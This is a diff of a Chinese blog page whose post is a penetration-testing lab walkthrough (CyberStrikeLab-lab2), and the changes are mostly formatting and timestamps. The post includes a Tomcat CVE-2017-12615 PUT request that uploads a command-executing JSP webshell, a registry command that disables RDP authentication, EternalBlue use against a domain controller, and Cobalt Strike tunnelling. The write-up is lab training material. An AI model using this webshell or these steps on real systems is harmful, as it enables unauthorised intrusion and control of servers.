@@ -30,7 +30,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
 <meta property="article:published_time" content="2025-03-07T14:32:17.000Z">
-<meta property="article:modified_time" content="2025-03-08T08:10:50.633Z">
+<meta property="article:modified_time" content="2025-03-09T11:34:14.679Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="综合渗透靶机">
 <meta name="twitter:card" content="summary">
@@ -390,7 +390,7 @@
         <div class="label text-third-text-color text-sm">分类</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
         <div class="label text-third-text-color text-sm">文章</div>
     </a>
 </div>
@@ -445,8 +445,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-03-08 16:10:50</span>
-            <span class="mobile">2025-03-08 16:10:50</span>
+            <span class="desktop">2025-03-09 19:34:14</span>
+            <span class="mobile">2025-03-09 19:34:14</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -510,7 +510,8 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<p>目标：公司派遣测试某网络的安全性。目标是成功获取所有服务器的权限，以评估网络安全状况。 </p>
+			<p><strong>难度: 简单</strong></p>
+<p>目标：公司派遣测试某网络的安全性。目标是成功获取所有服务器的权限，以评估网络安全状况。 </p>
 <p><strong>漏洞扫描：</strong></p>
 <p>对 192.168.10.* 网段进行扫描，发现 192.168.10.20 可能存在 CVE-2017-12615 历史漏洞，以及 192.168.10.10 74 CMS </p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] PocScan http://192.168.10.20:8080 poc-yaml-iis-put-getshell</span><br><span class="line">[+] PocScan http://192.168.10.20:8080 poc-yaml-tomcat-cve-2017-12615-rce</span><br></pre></td></tr></table></figure></div>
@@ -519,7 +520,7 @@
 
 
 
-<h2 id="独立工作站-192-168-10-10"><a href="#独立工作站-192-168-10-10" class="headerlink" title="独立工作站 - 192.168.10.10"></a>独立工作站 - 192.168.10.10</h2><p>骑士CMS 渗透，我对 808 端口进行目录扫描，扫描的同时对 Web 页面进行初步观测，尝试寻找 SQL 注入、SSRF 等常规 Web 漏洞，可惜并没有发现有效入口点</p>
+<h1 id="独立工作站-192-168-10-10"><a href="#独立工作站-192-168-10-10" class="headerlink" title="独立工作站 - 192.168.10.10"></a>独立工作站 - 192.168.10.10</h1><p>骑士CMS 渗透，我对 808 端口进行目录扫描，扫描的同时对 Web 页面进行初步观测，尝试寻找 SQL 注入、SSRF 等常规 Web 漏洞，可惜并没有发现有效入口点</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306211540734.png" class title="image-20250306211540734">
 
 <p>常规字典下扫描也没有发现特别信息</p>
@@ -530,7 +531,7 @@
 
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307141020560.png" class title="image-20250307141020560">
 
-<h3 id="弱口令-爆破"><a href="#弱口令-爆破" class="headerlink" title="弱口令&#x2F;爆破"></a>弱口令&#x2F;爆破</h3><p>直接输入错误账户名，会回显管理员账号不存在，这使得很顺利地测试出管理员账号名 admin</p>
+<h2 id="弱口令-爆破"><a href="#弱口令-爆破" class="headerlink" title="弱口令&#x2F;爆破"></a>弱口令&#x2F;爆破</h2><p>直接输入错误账户名，会回显管理员账号不存在，这使得很顺利地测试出管理员账号名 admin</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307143442587.png" class title="image-20250307143442587">
 
 <p>简单测试一下密码就出来了，靶机并没有在这方面上难为人</p>
@@ -561,7 +562,7 @@
 
 
 
-<h2 id="域边界突破-192-168-10-20"><a href="#域边界突破-192-168-10-20" class="headerlink" title="域边界突破 - 192.168.10.20"></a>域边界突破 - 192.168.10.20</h2><h3 id="Tomcat-任意文件写入"><a href="#Tomcat-任意文件写入" class="headerlink" title="Tomcat 任意文件写入"></a>Tomcat 任意文件写入</h3><img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307220024288.png" class title="image-20250307220024288">
+<h1 id="域边界突破-192-168-10-20"><a href="#域边界突破-192-168-10-20" class="headerlink" title="域边界突破 - 192.168.10.20"></a>域边界突破 - 192.168.10.20</h1><h2 id="Tomcat-任意文件写入"><a href="#Tomcat-任意文件写入" class="headerlink" title="Tomcat 任意文件写入"></a>Tomcat 任意文件写入</h2><img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307220024288.png" class title="image-20250307220024288">
 
 <p>接下来对 192.168.10.20 已经发现的 Nday 进行利用，手工抓包上传，Payload 如下</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">Host: 192.168.10.20:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 376</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>
@@ -582,7 +583,7 @@
 <p>拿到第二个旗帜</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306195005976.png" class title="image-20250306195005976">
 
-<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p><strong>上线CS</strong> </p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p><strong>上线CS</strong> </p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306172133812.png" class title="image-20250306172133812">
 
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306172640657.png" class title="image-20250306172640657">
@@ -599,7 +600,7 @@
 
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306201735177.png" class title="image-20250306201735177">
 
-<h3 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h3><p>开启 3389 后连接报错，是身份证验证错误，直接禁用掉</p>
+<h2 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h2><p>开启 3389 后连接报错，是身份证验证错误，直接禁用掉</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306204251884.png" class title="image-20250306204251884">
 
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></div>
@@ -611,7 +612,7 @@
 
 
 
-<h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>继续对当前主机进行信息收集</p>
+<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>继续对当前主机进行信息收集</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic computersystem get domainrole</span><br></pre></td></tr></table></figure></div>
 
 <p>返回数值为3，当前是一台域成员服务器</p>
@@ -626,13 +627,13 @@
 <p>fscan 扫描，发现域控服务器 192.168.20.30 且存在永恒之蓝漏洞</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250306210846820.png" class title="image-20250306210846820">
 
-<h3 id="域控-192-168-20-30"><a href="#域控-192-168-20-30" class="headerlink" title="域控 - 192.168.20.30"></a>域控 - 192.168.20.30</h3><p>msf 打永恒之蓝，通过 admin&#x2F;smb&#x2F;ms17_010_command 模块执行成功，拿到 flag</p>
+<h2 id="域控-192-168-20-30"><a href="#域控-192-168-20-30" class="headerlink" title="域控 - 192.168.20.30"></a>域控 - 192.168.20.30</h2><p>msf 打永恒之蓝，通过 admin&#x2F;smb&#x2F;ms17_010_command 模块执行成功，拿到 flag</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307173614525.png" class title="image-20250307173614525">
 
 <p>修改管理员密码，打开 3389 端口，拿下远程桌面</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/07/CyberStrikeLab-lab2/image-20250307174645182.png" class title="image-20250307174645182">
 
-<h3 id="代理转发上线-CS"><a href="#代理转发上线-CS" class="headerlink" title="代理转发上线 CS"></a>代理转发上线 CS</h3><p>之前直接利用 CS 的永恒之蓝漏洞插件攻击 20.30 失败，而我对上线 CS 又有执念。于是我尝试通过 iox 代理转发，给域控上传文件并上线 CS，因为实际上只需要做一层代理隧道，所以操作并不复杂。</p>
+<h2 id="代理转发上线-CS"><a href="#代理转发上线-CS" class="headerlink" title="代理转发上线 CS"></a>代理转发上线 CS</h2><p>之前直接利用 CS 的永恒之蓝漏洞插件攻击 20.30 失败，而我对上线 CS 又有执念。于是我尝试通过 iox 代理转发，给域控上传文件并上线 CS，因为实际上只需要做一层代理隧道，所以操作并不复杂。</p>
 <p>接下来 20.20 统称域成员主机，20.30 为域控</p>
 <p>首先生成 CS 马，配置为 <code>192.168.20.20:29999</code> 。然后在域成员跳板机开启第一层代理隧道</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iox.exe proxy -l 1080</span><br></pre></td></tr></table></figure></div>
@@ -672,7 +673,7 @@
         
             <li>
                 <strong>更新于
-                    :</strong> 2025-03-08 16:10:50
+                    :</strong> 2025-03-09 19:34:14
             </li>
         
         <li>
@@ -708,6 +709,18 @@
 
 		
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/03/08/CyberStrikeLab-lab3/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">CyberStrikeLab-lab3</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
 			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
@@ -778,7 +791,7 @@
 	<div class="post-toc">
 		<div class="toc-title">目录</div>
 		<div class="page-title">CyberStrikeLab-lab2</div>
-		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8B%AC%E7%AB%8B%E5%B7%A5%E4%BD%9C%E7%AB%99-192-168-10-10"><span class="nav-text">独立工作站 - 192.168.10.10</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E7%88%86%E7%A0%B4"><span class="nav-text">弱口令&#x2F;爆破</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E8%BE%B9%E7%95%8C%E7%AA%81%E7%A0%B4-192-168-10-20"><span class="nav-text">域边界突破 - 192.168.10.20</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="nav-text">Tomcat 任意文件写入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5"><span class="nav-text">远程桌面连接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="nav-text">域渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7-192-168-20-30"><span class="nav-text">域控 - 192.168.20.30</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF-CS"><span class="nav-text">代理转发上线 CS</span></a></li></ol></li></ol>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8B%AC%E7%AB%8B%E5%B7%A5%E4%BD%9C%E7%AB%99-192-168-10-10"><span class="nav-text">独立工作站 - 192.168.10.10</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E7%88%86%E7%A0%B4"><span class="nav-text">弱口令&#x2F;爆破</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E8%BE%B9%E7%95%8C%E7%AA%81%E7%A0%B4-192-168-10-20"><span class="nav-text">域边界突破 - 192.168.10.20</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="nav-text">Tomcat 任意文件写入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5"><span class="nav-text">远程桌面连接</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="nav-text">域渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7-192-168-20-30"><span class="nav-text">域控 - 192.168.20.30</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF-CS"><span class="nav-text">代理转发上线 CS</span></a></li></ol></li></ol>
 
 	</div>
 </div>
@@ -805,7 +818,7 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        共撰写了 8 篇文章
+                        共撰写了 9 篇文章
                     </span>
                     
                 </p>
